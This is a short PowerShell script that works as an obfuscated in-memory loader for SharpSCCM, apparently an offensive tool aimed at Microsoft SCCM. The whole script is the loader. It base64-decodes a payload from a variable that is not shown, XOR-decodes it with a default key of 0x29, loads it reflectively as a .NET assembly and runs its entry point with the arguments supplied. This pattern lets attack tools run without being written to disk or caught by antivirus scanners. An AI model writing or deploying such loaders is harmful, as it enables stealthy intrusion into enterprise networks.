function Load-XLdr_SharpSCCM { param([Parameter ()] $xk = "0x29")
$loadedAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Fullname -eq "SharpSCCM, Version=2.0.3.0, Culture=neutral, PublicKeyToken=null" }
if ($loadedAssembly) {
  return $loadedAssembly[0]  
}
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($1a3404d6)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
$asm_XLdr_SharpSCCM = [System.Reflection.Assembly]::Load($fb)
return $asm_XLdr_SharpSCCM
}
function Invoke-XLdr_SharpSCCM { param([Parameter ()] $Params = "-h")
$asm = Load-XLdr_SharpSCCM
$Params -eq "" -and ($Params = Read-Host "Specify command arguments")
$asm.EntryPoint.Invoke($null, (, $Params.split()))
}